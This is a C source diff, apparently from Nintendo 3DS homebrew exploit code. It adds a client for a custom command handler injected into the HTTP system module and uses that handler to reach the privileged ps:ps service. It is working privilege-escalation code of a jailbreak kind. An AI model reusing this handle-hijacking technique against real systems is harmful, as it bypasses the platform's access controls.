@@ -98,6 +98,41 @@ Result _httpcCloseContext(httpcContext *context, Handle *httpheap_sharedmem_hand
 	return ret;
 }
 
+/*
+The handleindex refers to what stored handle to process, must be 0-3(max 4 handles).
+The in_handle should be 0 unless type0 is used.
+Commands which don't match the 0x18010082 cmdhdr will be used with svcSendSyncRequest(storedhandle_index0).
+Type0: Set the stored handle to the specified in_handle.
+Type1: Return the stored handle with out_handle.
+Type2: Close+clear the stored handle.
+*/
+Result _HTTPC_CustomCmd(Handle handle, u32 type, u32 handleindex, Handle in_handle, Handle *out_handle)
+{
+	u32* cmdbuf=getThreadCommandBuffer();
+
+	cmdbuf[0]=IPC_MakeHeader(0x1801,2,2); // 0x18010082
+	cmdbuf[1]=type;
+	cmdbuf[2]=handleindex;
+	cmdbuf[3]=IPC_Desc_SharedHandles(1);
+	cmdbuf[4]=in_handle;
+	
+	Result ret=0;
+	if(R_FAILED(ret=svcSendSyncRequest(handle)))return ret;
+	ret = cmdbuf[1];
+
+	if(ret==0)
+	{
+		if(type==1 && out_handle)*out_handle = cmdbuf[3];
+	}
+
+	return cmdbuf[1];
+}
+
+Result _httpcCustomCmd(httpcContext *context, u32 type, u32 handleindex, Handle in_handle, Handle *out_handle)
+{
+	return _HTTPC_CustomCmd(context->servhandle, type, handleindex, in_handle, out_handle);
+}
+
 //This searches physmem for the page which starts with the data stored in cmpblock_bin. The first byte in cmpblock is XORed with 0x01 to avoid detecting the cmpblock in physmem.
 Result locate_sharedmem_linearaddr(u32 **linearaddr)
 {
@@ -220,6 +255,59 @@ Result setuphax_http_sslc(Handle httpc_sslc_handle, u8 *cert, u32 certsize)
 	}
 
 	sslcExit();
+
+	return ret;
+}
+
+Result test_customcmdhandler(httpcContext *context)
+{
+	Result ret=0;
+	psRSAContext rsactx;
+	u8 signature[0x100];
+	u8 cmphash[0x20];
+
+	memset(&rsactx, 0, sizeof(rsactx));
+	memset(signature, 0, sizeof(signature));
+	memset(cmphash, 0, sizeof(cmphash));
+	rsactx.rsa_bitsize = 0x100<<3;
+
+	_httpcCustomCmd(context, ~0, 0, 0, NULL);//Run the customcmd handler with an invalid type-value so that the static-buffer is setup, for use with PS_VerifyRsaSha256.
+
+	ret = psInitHandle(context->servhandle);
+	if(R_FAILED(ret))
+	{
+		printf("psInitHandle failed: 0x%08x.\n", (unsigned int)ret);
+		return ret;
+	}
+
+	ret = PS_VerifyRsaSha256(cmphash, &rsactx, signature);
+	if(ret!=0)
+	{
+		printf("Custom PS_VerifyRsaSha256 failed: 0x%08x.\n", (unsigned int)ret);
+	}
+
+	psExit();
+
+	if(ret!=0)return ret;
+
+	ret = psInit();
+	if(R_SUCCEEDED(ret))
+	{
+		printf("Testing with the actual ps:ps service...\n");
+
+		ret = PS_VerifyRsaSha256(cmphash, &rsactx, signature);
+		printf("PS_VerifyRsaSha256 returned 0x%08x.\n", (unsigned int)ret);
+
+		//ret = _httpcCustomCmd(context, u32 type, u32 handleindex, Handle in_handle, Handle *out_handle);
+
+		psExit();
+
+		ret = 0;
+	}
+	else//Ignore init failure since ps:ps normally isn't accessible.
+	{
+		ret = 0;
+	}
 
 	return ret;
 }
@@ -384,12 +472,25 @@ Result http_haxx(char *requrl, u8 *cert, u32 certsize, targeturlctx *first_targe
 			return ret;
 		}
 
-		ret = httpcAddPostDataAscii(&context, "form_name", "form_value");
-		if((i!=2 && R_FAILED(ret)) || (i==2 && ret!=0xd8e007f7))
+		if(i!=2)//Normal httpc commands shouldn't be used with the custom cmdhandler session-handle at this point, since memory will be left mapped in http-sysmodule.
 		{
-			printf("httpcAddPostDataAscii returned 0x%08x, i=%u.\n", (unsigned int)ret, (unsigned int)i);
-			httpcCloseContext(&context);
-			return ret;
+			ret = httpcAddPostDataAscii(&context, "form_name", "form_value");
+			if(R_FAILED(ret))
+			{
+				printf("httpcAddPostDataAscii returned 0x%08x, i=%u.\n", (unsigned int)ret, (unsigned int)i);
+				httpcCloseContext(&context);
+				return ret;
+			}
+		}
+
+		if(i==2)
+		{
+			ret = test_customcmdhandler(&context);
+			if(R_FAILED(ret))
+			{
+				printf("test_customcmdhandler returned 0x%08x.\n", (unsigned int)ret);
+				return ret;
+			}
 		}
 
 		ret = httpcCloseContext(&context);
